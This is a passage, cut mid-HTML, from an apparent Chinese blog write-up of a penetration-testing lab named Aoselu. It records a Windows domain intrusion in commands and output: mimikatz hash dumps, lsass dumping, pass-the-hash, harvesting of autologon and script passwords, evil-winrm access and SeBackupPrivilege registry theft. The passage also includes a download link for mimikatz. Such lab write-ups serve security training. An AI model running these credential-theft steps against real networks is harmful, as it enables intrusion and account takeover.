/domain</span><br><span class="line">Current time at \\ASLSRVAD05.aoseluauto.com is <span class="number">7</span>/<span class="number">8</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">55</span>:<span class="number">14</span> PM</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>读取sam获取hash（其他方法报错）</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/32.png"></p><p>一开始以为是这个问题，一直试都没成功</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Hundredsu\Desktop\x64&gt;mimikatz.exe <span class="string">&quot;lsadump::sam&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::sam</span></span><br><span class="line">Domain : ASLITPC03</span><br><span class="line">SysKey : <span class="number">1</span>c1d48aedd972a736190a9d7ad6372f1</span><br><span class="line">Local SID : S<span class="literal">-1-5-21-3910597396-2766426005-48596025</span></span><br><span class="line"></span><br><span class="line">SAMKey : aa660572728ee137643c2f81e02693c4</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: d41d2c4614bf18fa34726d4c1ba69fc2</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : ad91da6da89ad2e12bad94f34d7bd7d2</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : WIN<span class="literal">-1FDC75TLQPRAdministrator</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5_nt    (<span class="number">4096</span>) : <span class="number">1536102263</span>bc27d1b3c13b188715a912ce4747ca460ee1630dddd746c1b08ea5</span><br><span class="line">      unknow            (<span class="number">4096</span>) : <span class="number">88172</span>a4be5167d9c154c3a6f473da3f2</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">05</span>fad896627657ffd593f8a3112079cd308c787846dfc4dcf2a1efcc38c44044</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">96</span>acfc5f83c4585559cdfe8e34b2489d</span><br><span class="line">      rc4_hmac_nt       (<span class="number">4096</span>) : d41d2c4614bf18fa34726d4c1ba69fc2</span><br><span class="line">    ServiceCredentials</span><br><span class="line">      des_cbc_md5_nt    (<span class="number">4096</span>) : <span class="number">1536102263</span>bc27d1b3c13b188715a912ce4747ca460ee1630dddd746c1b08ea5</span><br><span class="line">      unknow            (<span class="number">4096</span>) : <span class="number">88172</span>a4be5167d9c154c3a6f473da3f2</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">05</span>fad896627657ffd593f8a3112079cd308c787846dfc4dcf2a1efcc38c44044</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">96</span>acfc5f83c4585559cdfe8e34b2489d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f7 (<span class="number">503</span>)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f8 (<span class="number">504</span>)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: <span class="number">4</span>bf0ee8fd1cc326bb824ecfd02235086</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">7</span>c6a36b8522c6075c5ada89d87d1ec2b</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : f76f23dbaafe66d7cf8a42cee7911f1e2f90865c4bb1d1f085ac34e47887facf</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">871422</span>be7656216911212d113ef5c75d</span><br><span class="line">      rc4_hmac_nt       (<span class="number">4096</span>) : <span class="number">4</span>bf0ee8fd1cc326bb824ecfd02235086</span><br><span class="line">    ServiceCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : f76f23dbaafe66d7cf8a42cee7911f1e2f90865c4bb1d1f085ac34e47887facf</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">871422</span>be7656216911212d113ef5c75d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>e8 (<span class="number">1000</span>)</span><br><span class="line">User : Hundredsu</span><br><span class="line">  Hash NTLM: <span class="number">72</span>d98c440b25ce7b05d81233044c020c</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">84</span>bf95fe1d8b236e4c9c75847e8176bf</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">72</span>d98c440b25ce7b05d81233044c020c</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">897</span>ddb49d329b92a806b9981dda39c6c</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : ASLITPC03.AOSELUAUTO.COMHundredsu</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5_nt    (<span class="number">4096</span>) : <span class="number">88</span>d6360e371965d5d3b613571d7e51ca1d70d83a030744deb3d5addbc59e3047</span><br><span class="line">      unknow            (<span class="number">4096</span>) : <span class="number">40</span>f0e1a4c2561a193bebeec1e57479ec</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">18</span>cda8a4f456a95f166ba225066404730067d76c9afe14bffb51f6cad8328b28</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">90</span>ff1329a9aa768508b8783bbc1eb57b</span><br><span class="line">      rc4_hmac_nt       (<span class="number">4096</span>) : <span class="number">72</span>d98c440b25ce7b05d81233044c020c</span><br><span class="line">    ServiceCredentials</span><br><span class="line">      des_cbc_md5_nt    (<span class="number">4096</span>) : <span class="number">88</span>d6360e371965d5d3b613571d7e51ca1d70d83a030744deb3d5addbc59e3047</span><br><span class="line">      unknow            (<span class="number">4096</span>) : <span class="number">40</span>f0e1a4c2561a193bebeec1e57479ec</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">18</span>cda8a4f456a95f166ba225066404730067d76c9afe14bffb51f6cad8328b28</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">90</span>ff1329a9aa768508b8783bbc1eb57b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py aoseluauto.com/Administrator@<span class="number">172.16</span>.<span class="number">36.21</span> <span class="literal">-hashes</span> :d41d2c4614bf18fa34726d4c1ba69fc2 <span class="literal">-just-dc-ntlm</span></span><br></pre></td></tr></table></figure><p>没成功</p><h4 id="SharpHound信息收集"><a href="#SharpHound信息收集" class="headerlink" title="SharpHound信息收集"></a>SharpHound信息收集</h4><p>使用SharpHound信息收集一下，要注意版本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe <span class="literal">-c</span> all</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/33.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/34.png"></p><p>那么接下来我们要获取到SVC_MOMADM01的hash</p><p>由于系统问题，一直抓取不到hash，那么各种方法都试了一下</p><h4 id="远程密码获取-Procdump-Mimikatz（没成功）"><a href="#远程密码获取-Procdump-Mimikatz（没成功）" class="headerlink" title="远程密码获取-Procdump+Mimikatz（没成功）"></a><font style="color:rgb(0, 0, 0);">远程密码获取-Procdump+Mimikatz（没成功）</font></h4><p>使用<font style="color:rgb(0, 0, 0);">Procdump+Mimikatz的方法</font></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</span><br><span class="line">procdump64.exe <span class="literal">-accepteula</span> <span class="literal">-ma</span> lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">将lsass.dmp下载到本地后，然后执行mimikatz:</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为了方便复制与查看，可以输出到本地文件里面：</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt</span><br></pre></td></tr></table></figure><p>也还是报一样的错</p><p><a href="https://mp.weixin.qq.com/s/rcxeh80Avd9uOCl1brRpSw">https://mp.weixin.qq.com/s/rcxeh80Avd9uOCl1brRpSw</a></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/35.png"></p><p>下了最新版还是不行</p><p><a href="https://mp.weixin.qq.com/s/BcbwNer-Qsm-IVOpvsmfIw">https://mp.weixin.qq.com/s/BcbwNer-Qsm-IVOpvsmfIw</a></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/36.png"></p><p>是上述的原因，但是机子关了，就没有使用下面的mimikatz抓密码了</p><p>下面这个</p><p>通过网盘分享的文件：mimikatz.zip链接: <a href="https://pan.baidu.com/s/12Haf0i0VI0NWeI3oTpiqFQ?pwd=h7dk">https://pan.baidu.com/s/12Haf0i0VI0NWeI3oTpiqFQ?pwd=h7dk</a> 提取码: h7dk –来自百度网盘超级会员v4的分享</p><p>想直接mimikatz打pth开个cmd的，没成功</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:<span class="number">172.16</span>.<span class="number">36.21</span> /ntlm:d41d2c4614bf18fa34726d4c1ba69fc2</span><br></pre></td></tr></table></figure><h4 id="autologin的配置"><a href="#autologin的配置" class="headerlink" title="autologin的配置"></a>autologin的配置</h4><p>发现路走歪了</p><p>信息收集没做全</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v AutoAdminLogon</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    AutoAdminLogon    REG_SZ    <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultPassword</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    DefaultPassword    REG_SZ    DROCV4?LtyCp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultUsername</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    DefaultUsername    REG_SZ    EthanMorris</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultDomain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultDomainName</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    DefaultDomainName    REG_SZ    aoseluauto.com</span><br></pre></td></tr></table></figure><p>可以获取到EthanMorris的账密</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/37.png"></p><p>查看一下对哪些文件可以观看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> nxc smb <span class="number">172.16</span>.<span class="number">34.23</span> <span class="literal">-u</span> EthanMorris <span class="literal">-p</span> <span class="string">&#x27;DROCV4?LtyCp&#x27;</span> <span class="literal">--shares</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Hundredsu)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q nxc smb 172.16.34.23 -u EthanMorris -p &#x27;DROCV4?LtyCp&#x27; --shares</span></span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [*] Windows <span class="number">10</span> / Server <span class="number">2019</span> Build <span class="number">17763</span> x64 (name:ASLSRVFS02) (domain:aoseluauto.com) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [+] aoseluauto.com\EthanMorris:DROCV4?LtyCp</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [*] Enumerated shares</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       Share           Permissions     Remark</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       <span class="literal">-----</span>           <span class="literal">-----------</span>     <span class="literal">------</span></span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       ADMIN<span class="variable">$</span>                          Remote Admin</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       C<span class="variable">$</span>                              Default share</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       FileService     READ,<span class="built_in">WRITE</span>      Aoselu FileService</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       IPC<span class="variable">$</span>            READ            Remote IPC</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>域用户<code>&lt;font style=&quot;color:rgb(155, 110, 35);background-color:rgb(255, 245, 227);&quot;&gt;EthanMorris&lt;/font&gt;</code>只对<code>&lt;font style=&quot;color:rgb(155, 110, 35);background-color:rgb(255, 245, 227);&quot;&gt;ASLSRVFS02$&lt;/font&gt;</code>主机上的共享文件夹<code>&lt;font style=&quot;color:rgb(155, 110, 35);background-color:rgb(255, 245, 227);&quot;&gt;FileService&lt;/font&gt;</code>有读写权限。</p><p>smb进一步信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbclient.py aoseluauto.com/EthanMorris:DROCV4?LtyCp@<span class="number">172.16</span>.<span class="number">34.23</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shares</span></span><br><span class="line">ADMIN<span class="variable">$</span></span><br><span class="line">C<span class="variable">$</span></span><br><span class="line">FileService</span><br><span class="line">IPC<span class="variable">$</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面我们得知是处于172.16.34.23的用户都是在ITgroup里的，直接看IT</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/38.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/39.png"></p><p>找到几个账密，主要是要用svc_bakadm01</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --- credentials ---</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;aoseluauto\svc_bakadm01&quot;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;k3!8Fa&amp;Sq8Z6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$backupUser</span> = <span class="string">&quot;aoseluauto\\svc_bakadm02&quot;</span></span><br><span class="line"><span class="variable">$backupPassPlain</span> = <span class="string">&quot;CYNpR5i@Z?_=&quot;</span></span><br></pre></td></tr></table></figure><p>那么我们rdp</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/40.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/41.png"></p><p>很奇怪，直接rdp上去，权限是不够的</p><p>使用evil-winrm打一下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Hundredsu)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q evil-winrm -i 172.16.34.23 -u svc_bakadm01 -p &#x27;k3!8Fa&amp;Sq8Z6&#x27;</span></span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v3.<span class="number">7</span></span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class="string">&#x27; for module Reline</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Info: Establishing connection to remote endpoint</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\svc_bakadm01\Documents&gt; whoami /priv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PRIVILEGES INFORMATION</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Privilege Name                Description                    State</span></span><br><span class="line"><span class="string">============================= ============================== =======</span></span><br><span class="line"><span class="string">SeBackupPrivilege             Back up files and directories  Enabled</span></span><br><span class="line"><span class="string">SeRestorePrivilege            Restore files and directories  Enabled</span></span><br><span class="line"><span class="string">SeShutdownPrivilege           Shut down the system           Enabled</span></span><br><span class="line"><span class="string">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span></span><br><span class="line"><span class="string">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></span><br></pre></td></tr></table></figure><h4 id="SeBackupPrivilege-注册表提权"><a href="#SeBackupPrivilege-注册表提权" class="headerlink" title="SeBackupPrivilege-注册表提权"></a>SeBackupPrivilege-注册表提权</h4><p>这里可以看到有SeBackupPrivilege</p><p>注册表获取</p><p><code>reg save HKLM\SYSTEM sys.hiv</code></p><p><code>reg save HKLM\SAM sam.hiv</code></p><p><code>lsadump::sam /SAM:sam.hiv /SYSTEM:sys.hiv</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_bakadm01\Documents&gt; reg save HKLM\SYSTEM sys.hiv</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_bakadm01\Documents&gt; reg save HKLM\SAM sam.hiv</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/42.png"></p><p>rdp下载或者用工具下载下来</p><p>解密hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::sam /SAM:sam.hiv /SYSTEM:sys.hiv</span></span><br><span class="line">Domain : ASLSRVFS02</span><br><span class="line">SysKey : <span class="number">833</span>ec52f6f12689eda8e8ed4d5374009</span><br><span class="line">Local SID : S<span class="literal">-1-5-21-3738990733-2195238930-2414615058</span></span><br><span class="line"></span><br><span class="line">SAMKey : <span class="number">4</span>d4878654b95321d05917e2ee1249147</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: <span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab</span><br><span class="line">    lm  - <span class="number">0</span>: e7bad95587f6ad969d96d05667fe8c19</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab</span><br><span class="line">    ntlm- <span class="number">1</span>: <span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : b39fea8560c0eefaa1f07243f16fd7ea</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : ASLSRVFS02.AOSELUAUTO.COMAdministrator</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span 